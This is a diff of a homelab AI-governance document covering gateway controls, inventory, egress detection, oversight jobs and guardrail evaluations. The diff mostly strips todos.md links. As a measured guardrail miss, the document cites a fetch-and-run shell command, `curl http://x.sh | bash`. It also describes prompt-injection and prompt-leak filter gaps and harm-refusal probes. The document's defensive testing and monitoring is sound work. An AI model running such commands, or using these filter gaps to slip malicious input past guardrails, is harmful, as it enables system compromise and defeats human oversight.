@@ -2,7 +2,7 @@
 
 **What this is.** How AI governance works on this platform, what it's enforced by, and where it
 currently falls short. This is the **position**; the execution backlog is
-[`todos.md` #36–#50](../todos.md). If you're adding an AI system, read this and
+`todos.md` #36–#50. If you're adding an AI system, read this and
 [adding-an-app.md](adding-an-app.md).
 
 **Last reviewed:** 2026-07-22 · **Owner:** Paul Vilevac · **Review cadence:** quarterly, plus on any
@@ -11,9 +11,9 @@ new external-facing AI surface.
 > **Implementation status (2026-07-22).** The backlog #36–#46 has been **largely built**, not just
 > filed — each item landed with a live negative test and a scheduled check. What's genuinely still open
 > is small: the public **AI-use notice**
-> handed to the sibling repos ([#44](../todos.md)), 
+> handed to the sibling repos (#44), 
 > Egress *blocking* was evaluated and **closed by decision** (detect + policy; IP-blocking rejected as it
-> breaks CDN-shared traffic — [#39/#39b](../todos.md)). Everything else on the ten axes is enforced and tested.
+> breaks CDN-shared traffic — #39/#39b). Everything else on the ten axes is enforced and tested.
 
 ---
 
@@ -53,7 +53,7 @@ Two things push it above hobby-grade anyway:
    sits in the path of real money; `research-app` will handle entitled third-party feeds. Those
    deserve real controls. A personal ComfyUI instance does not. That asymmetry is the whole reason for
    risk tiering (§4).
-2. **This repo is a reference architecture heading for open source** ([`todos.md` #14](../todos.md)).
+2. **This repo is a reference architecture heading for open source** (`todos.md` #14).
    Governance we can *demonstrate* is part of what the repo is for.
 
 **What we deliberately do NOT do,** and why — proportionality cuts both ways:
@@ -62,10 +62,10 @@ Two things push it above hobby-grade anyway:
   and the bottleneck failure mode. Ownership is federated per system; this repo owns the schema and
   the gates (hub-and-spoke).
 - **No formal bias/fairness program.** Wrong proportionality for internal tooling. Harm-category
-  refusal tests on the *public* surfaces are folded into the eval suite instead ([#42](../todos.md)).
+  refusal tests on the *public* surfaces are folded into the eval suite instead (#42).
 - **No ISO 42001 certification pursuit.** We borrow its structure; we're not buying an audit.
 - **No model training.** We run open-weight models as-is. Training-data governance is therefore
-  out of scope; **corpus** governance ([#43](../todos.md)) is very much in.
+  out of scope; **corpus** governance (#43) is very much in.
 
 ---
 
@@ -79,13 +79,13 @@ control needs a fifth, that's a design smell worth arguing about.
 |---|---|---|---|
 | **1** | **Traefik + Keycloak** (middleware chains, `secure-sso@file` / `secure-chain@file`, oauth2-proxy) | *Who reaches what.* No service is exposed without an explicit chain; SSO is one label, not a per-app integration | ✅ **Operating** |
 | **2** | **Infisical** (`pull-secrets.sh` / `push-secret.sh`) | *What credentials exist.* Single source of truth; `.env` is a generated artifact; hand-editing on the host is a documented violation | ✅ **Operating** |
-| **3** | **LiteLLM gateway** (virtual keys, model scoping, Langfuse tracing) | *What may talk to a model, and every call is recorded* | ✅ **Operating** — scoping, budgets, rate limits, expiry all applied per tier and **429 negative-tested**; no runtime consumer holds the master key; the host LLM is closed to the LAN. Container egress to cloud providers is **detected + policy-gated** (IP-blocking rejected on evidence, SNI proxy filed [#39b](../todos.md)). Since **2026-07-23** the gateway fronts three third-party models via OpenRouter — so the control point is no longer theoretical: those calls are scoped, budgeted, rate-limited and Langfuse-attributed exactly like local ones |
+| **3** | **LiteLLM gateway** (virtual keys, model scoping, Langfuse tracing) | *What may talk to a model, and every call is recorded* | ✅ **Operating** — scoping, budgets, rate limits, expiry all applied per tier and **429 negative-tested**; no runtime consumer holds the master key; the host LLM is closed to the LAN. Container egress to cloud providers is **detected + policy-gated** (IP-blocking rejected on evidence, SNI proxy filed #39b). Since **2026-07-23** the gateway fronts three third-party models via OpenRouter — so the control point is no longer theoretical: those calls are scoped, budgeted, rate-limited and Langfuse-attributed exactly like local ones |
 | **4** | **AI inventory + AI-BOM** | *What is approved to exist.* Approval in the registry **is** the credential — an unregistered system can't authenticate | ✅ **Operating** — `docs/ai-inventory.yml` + a generated BOM, drift-checked in CI (static) and weekly on jarvis (live), alerting via Alertmanager → Discord |
 
 A fifth surface, **the log pipeline (Promtail → Loki)**, is where governance is *un-done* if unattended:
 services echo secrets to stdout that we don't control at the source (the host LLM printed its API key in
 its startup banner). Promtail now **redacts by shape** before storage, and Loki's delete API purges what
-already leaked ([#12/#49](../todos.md)). It's a guard rail on the other four, not a fifth control point.
+already leaked (#12/#49). It's a guard rail on the other four, not a fifth control point.
 
 Two structural principles behind these:
 
@@ -142,13 +142,13 @@ job that fails loudly; anything marked ⚠️ or ❌ says what is actually missi
 | **Accountability & oversight** | ✅ Operating | Named owner + named human-oversight point per system; a **tested** kill-switch (revoke → 401); an [incident runbook](ai-incident-response.md) and [acceptable-use page](ai-acceptable-use.md). **Closed 2026-07-24:** the public-transcript review is now a weekly job with an artifact, four metrics and a dead-man — and, unusually, a **second dead-man on the human**: `AiOversightUnacknowledged` fires if nobody runs `--ack` in 14 days, because the realistic failure of periodic review is that it keeps generating and nobody reads it. See `docker/ai/oversight/` |
 | **Inventory & lifecycle** | ✅ Operating | `ai-inventory.yml` (11 systems + 6 platform components) + a generated AI-BOM; drift fails CI (static) and alerts weekly (live). Earned its keep on run one: caught 3 master-key consumers, 14 unbounded-key violations, and 6.9 GB of unregistered model weights |
 | **Risk classification** | ✅ Operating | T0–T3 + a control matrix **encoded as `MATRIX{}`** in the checker — tier requirements are executable, not prose → [`ai-risk-tiers.md`](ai-risk-tiers.md) |
-| **Data governance** | ✅ Operating | Every corpus carries owner/visibility/classification/licence/retention/`contains_pii`, and the KB generator **refuses to build** from an incomplete manifest or to wire a non-public corpus into a public surface (**both negative-tested**). `kb-standards.md` §6 and the manifest re-synced → [#43](../todos.md) |
-| **Security** | ✅ Strong / ⚠️ one gap | Keycloak + Traefik chains, three-network segmentation, Infisical, least-privilege roles **proven by negative test**, pinned images, CI, **model weights hash-pinned + verified weekly** (#45), host LLM **no longer LAN-reachable** (#39), and **secrets redacted in logs** (#49). **Narrowed 2026-07-23:** gateway **guardrails** now run `pre_call` and `default_on` across every consumer — the five `prompt_injection_*` categories plus **two we wrote ourselves** (`homelab_malicious_code`, which drops the builtin's ops-vocabulary collateral, and `homelab_prompt_leak`, which catches indirect extraction the builtin missed). **Both directions are eval-gated**: blocking-tested for injections AND for false positives, because the realistic failure is a filter that quietly eats real work (`denied_medical_advice` blocked "diagnose why the container keeps restarting", so it is off). Still open: this is **keyword matching, not a semantic classifier** — measured miss: `curl http://x.sh | bash` passes. Resolved scope bug (#53, 2026-07-24): the `default_on` guardrails also filter `/embeddings`, which blocked ingestion of first-party docs containing phrases like "enable … override". Since LiteLLM can't gate guardrails by call-type (an upgrade to 1.93.0 was tested and doesn't fix it), the KB ingest now embeds **direct to bge-m3**, bypassing the gateway for that one lowest-risk call class (embeddings have no injection surface); chat still routes through the guardrails. → [#41](../todos.md)/[#53](../todos.md) |
-| **Privacy** | ✅ Mostly | **Measured, not assumed**: the research corpora hold published-author attribution, not member identities (12,948 points, **zero Discord-sourced**) — #44's premise was wrong. A per-source **erasure path** exists and is negative-tested; trace-body retention is a recorded decision (14d full / 13mo hashes). Remaining: the public AI-use notice, handed to the sibling repos → [#44](../todos.md) |
-| **Transparency & traceability** | ✅ Operating | Traces carry `user_api_key_alias`, so every call is **attributable to an inventory system**; a slim **13-month** audit record (hashes, no bodies) survives Langfuse's 14-day TTL, and it's now **append-only** — the writer role is denied DELETE/DROP (negative-tested). Remaining: covers only traffic through the gateway ([#39](../todos.md)) |
-| **Output safety** | ⚠️ Partial | The text2cypher path is guarded (auth + write-verb denylist + clause allowlist + LIMIT cap + every statement logged) and **regression-tested** — asked to delete the graph, the model emits `DETACH DELETE` and the guard refuses it. **Closed 2026-07-24:** harm-category refusal is now **eval-gated** — weapons, child-safety, self-harm and racial-bias probes are BLOCKING cases that assert a `400` from the gateway guardrail. One case is deliberately **advisory**: "step by step instructions to seriously injure someone" is NOT caught by the keyword list and is declined by the *model* — defence-in-depth, not a control, so asserting it would encode a guarantee we do not have. That honest split is the remaining argument for [#41](../todos.md) |
+| **Data governance** | ✅ Operating | Every corpus carries owner/visibility/classification/licence/retention/`contains_pii`, and the KB generator **refuses to build** from an incomplete manifest or to wire a non-public corpus into a public surface (**both negative-tested**). `kb-standards.md` §6 and the manifest re-synced → #43 |
+| **Security** | ✅ Strong / ⚠️ one gap | Keycloak + Traefik chains, three-network segmentation, Infisical, least-privilege roles **proven by negative test**, pinned images, CI, **model weights hash-pinned + verified weekly** (#45), host LLM **no longer LAN-reachable** (#39), and **secrets redacted in logs** (#49). **Narrowed 2026-07-23:** gateway **guardrails** now run `pre_call` and `default_on` across every consumer — the five `prompt_injection_*` categories plus **two we wrote ourselves** (`homelab_malicious_code`, which drops the builtin's ops-vocabulary collateral, and `homelab_prompt_leak`, which catches indirect extraction the builtin missed). **Both directions are eval-gated**: blocking-tested for injections AND for false positives, because the realistic failure is a filter that quietly eats real work (`denied_medical_advice` blocked "diagnose why the container keeps restarting", so it is off). Still open: this is **keyword matching, not a semantic classifier** — measured miss: `curl http://x.sh | bash` passes. Resolved scope bug (#53, 2026-07-24): the `default_on` guardrails also filter `/embeddings`, which blocked ingestion of first-party docs containing phrases like "enable … override". Since LiteLLM can't gate guardrails by call-type (an upgrade to 1.93.0 was tested and doesn't fix it), the KB ingest now embeds **direct to bge-m3**, bypassing the gateway for that one lowest-risk call class (embeddings have no injection surface); chat still routes through the guardrails. → #41/#53 |
+| **Privacy** | ✅ Mostly | **Measured, not assumed**: the research corpora hold published-author attribution, not member identities (12,948 points, **zero Discord-sourced**) — #44's premise was wrong. A per-source **erasure path** exists and is negative-tested; trace-body retention is a recorded decision (14d full / 13mo hashes). Remaining: the public AI-use notice, handed to the sibling repos → #44 |
+| **Transparency & traceability** | ✅ Operating | Traces carry `user_api_key_alias`, so every call is **attributable to an inventory system**; a slim **13-month** audit record (hashes, no bodies) survives Langfuse's 14-day TTL, and it's now **append-only** — the writer role is denied DELETE/DROP (negative-tested). Remaining: covers only traffic through the gateway (#39) |
+| **Output safety** | ⚠️ Partial | The text2cypher path is guarded (auth + write-verb denylist + clause allowlist + LIMIT cap + every statement logged) and **regression-tested** — asked to delete the graph, the model emits `DETACH DELETE` and the guard refuses it. **Closed 2026-07-24:** harm-category refusal is now **eval-gated** — weapons, child-safety, self-harm and racial-bias probes are BLOCKING cases that assert a `400` from the gateway guardrail. One case is deliberately **advisory**: "step by step instructions to seriously injure someone" is NOT caught by the keyword list and is declined by the *model* — defence-in-depth, not a control, so asserting it would encode a guarantee we do not have. That honest split is the remaining argument for #41 |
 | **Reliability & monitoring** | ✅ Operating | Infra monitoring as before, plus a **9-case eval suite** (7 blocking) running daily and **negative-tested** — widening a key's scope makes it fail. **15 AI-specific alert rules across 5 groups** (`ai-governance`, `ai-egress`, `ai-model-integrity`, `ai-audit`, `ai-evals`), every group with a dead-man |
-| **Third-party & shadow AI** | ✅ Detect + policy (block deferred, by decision) | Hostname-accurate **detection** ships (`check-egress.sh` + AdGuard, weekly, dead-man). **Changed 2026-07-23:** the platform is no longer local-only — three `openrouter/*` models are configured on the gateway for testing/demo, on a **dedicated `openwebui-external` key** with an **enforced `max_budget` of $5/30d** that binds before the **$10 prepaid credit** (auto-recharge off) — the ceiling is arithmetic, not trust. Which limits actually enforce was **measured, not assumed**: deployment-level `rpm`/`tpm`, `enable_pre_call_checks`, `usage-based-routing-v2` and key `tpm_limit` all failed to bite under a 65k-token/minute push; only key `rpm_limit` and `max_budget` returned 429. The unenforcing config was removed rather than left in place looking like a control. The detector was updated in the same change to split **sanctioned** providers (configured on the gateway → expected) from unsanctioned ones, and a new `homelab_ai_egress_unsanctioned_dns_queries` metric carries the anomaly signal — otherwise a permanent weekly "SEEN openrouter.ai" would have trained us to ignore the control. The acceptable-use policy names the rule and lists the three models; the inventory drift-check flags a new provider consumer (**negative-tested 2026-07-23**: dropping a model from the inventory while the key still allowed it raised `model_scope_drift`). IP-level *blocking* was evaluated and **rejected on evidence** — providers sit on Cloudflare/Google **shared anycast IPs**, so dropping them collaterally breaks legit web fetch + the public tunnels ([`egress-decision.md`](egress-decision.md)). The real block (an SNI proxy) is filed [#39b](../todos.md), trigger-gated |
+| **Third-party & shadow AI** | ✅ Detect + policy (block deferred, by decision) | Hostname-accurate **detection** ships (`check-egress.sh` + AdGuard, weekly, dead-man). **Changed 2026-07-23:** the platform is no longer local-only — three `openrouter/*` models are configured on the gateway for testing/demo, on a **dedicated `openwebui-external` key** with an **enforced `max_budget` of $5/30d** that binds before the **$10 prepaid credit** (auto-recharge off) — the ceiling is arithmetic, not trust. Which limits actually enforce was **measured, not assumed**: deployment-level `rpm`/`tpm`, `enable_pre_call_checks`, `usage-based-routing-v2` and key `tpm_limit` all failed to bite under a 65k-token/minute push; only key `rpm_limit` and `max_budget` returned 429. The unenforcing config was removed rather than left in place looking like a control. The detector was updated in the same change to split **sanctioned** providers (configured on the gateway → expected) from unsanctioned ones, and a new `homelab_ai_egress_unsanctioned_dns_queries` metric carries the anomaly signal — otherwise a permanent weekly "SEEN openrouter.ai" would have trained us to ignore the control. The acceptable-use policy names the rule and lists the three models; the inventory drift-check flags a new provider consumer (**negative-tested 2026-07-23**: dropping a model from the inventory while the key still allowed it raised `model_scope_drift`). IP-level *blocking* was evaluated and **rejected on evidence** — providers sit on Cloudflare/Google **shared anycast IPs**, so dropping them collaterally breaks legit web fetch + the public tunnels ([`egress-decision.md`](egress-decision.md)). The real block (an SNI proxy) is filed #39b, trigger-gated |
 
 **Summary judgment (updated 2026-07-22, after the implementation pass).** The enforcement spine —
 **inventory → credential → chokepoint** — is built and tested: #36/#37 made the registry and control
@@ -163,7 +163,7 @@ reaching the logs.
 The last "gap" — shadow-AI *blocking* — turned out on inspection to be an IP-blocking approach that
 would break legitimate CDN-fronted traffic (providers share Cloudflare/Google anycast IPs), so it was
 replaced by detect-and-alert + policy + no-cloud-configured, with an SNI-filtering egress proxy filed
-([#39b](../todos.md)) for the day a trigger makes it proportionate. That is the honest close: not every
+(#39b) for the day a trigger makes it proportionate. That is the honest close: not every
 gap is a build — some are a decision, made on evidence and written down.
 
 The pattern worth keeping: every item landed with a **negative test** — a 429, a `connection refused`,
@@ -185,7 +185,7 @@ Borrowed for structure and vocabulary, not compliance:
   operation, §9 performance evaluation, §10 improvement). Used as a checklist, not a certification target.
 - **EU AI Act** — the risk-tier vocabulary (prohibited / high-risk / limited / minimal) behind §4, and
   the **limited-risk transparency** obligation — disclose that a human is interacting with AI — which is
-  why the public-surface notice is in [#44](../todos.md).
+  why the public-surface notice is in #44.
 - **OWASP Top 10 for LLM Applications** — the security slice: prompt injection (LLM01), insecure output
   handling (LLM02), supply chain (LLM03), poisoning (LLM04), excessive agency (LLM06), unbounded
   consumption (LLM10). **Vetted item-by-item in [owasp-llm-top10-coverage.md](owasp-llm-top10-coverage.md)** — 5 enforced-and-tested, 4 partial, 1 gap being closed.
@@ -212,12 +212,12 @@ A filed backlog is not a program. Four things convert it:
 3. **Federated ownership, central schema.** Sibling repos (`assistant-app`, `web-app`, `example-app`,
    `research-app`, `content-curator`, `example-site-web`, `home-assistant-infra`) own their
    inventory entry's *content* and propose their own tier. This repo owns the schema and the gate.
-   Handoffs go in **their** repo per [`CLAUDE.md`](../CLAUDE.md) — don't edit sibling configs.
+   Handoffs go in **their** repo per `CLAUDE.md` — don't edit sibling configs.
 4. **Honest status, dated.** §5 is a live posture table, not an aspiration. When something is absent it
    says absent. A governance doc that reads as uniformly green is the tell that nobody's checking.
 
-**The enforcement spine — [#36](../todos.md) inventory → [#38](../todos.md) bounded credentials →
-[#39](../todos.md) chokepoint — is the load-bearing structure; everything else is refinement on top of
+**The enforcement spine — #36 inventory → #38 bounded credentials →
+#39 chokepoint — is the load-bearing structure; everything else is refinement on top of
 it.** Two of the three are done and tested. The third is half-done: the host LLM is closed to the LAN,
 but container **egress to public providers is detected, not blocked** — that's the single most valuable
 remaining piece, and it's a real system to build (a per-network egress proxy only the gateway may
@@ -244,7 +244,7 @@ Prometheus and alerting via Alertmanager → Discord with a dead-man:
 
 | Topic | Doc |
 |---|---|
-| Execution backlog (#36–#50) | [`todos.md`](../todos.md) |
+| Execution backlog (#36–#50) | `todos.md` |
 | Risk tiers + control matrix | [ai-risk-tiers.md](ai-risk-tiers.md) |
 | AI incident response + kill-switch | [ai-incident-response.md](ai-incident-response.md) |
 | Acceptable use | [ai-acceptable-use.md](ai-acceptable-use.md) |
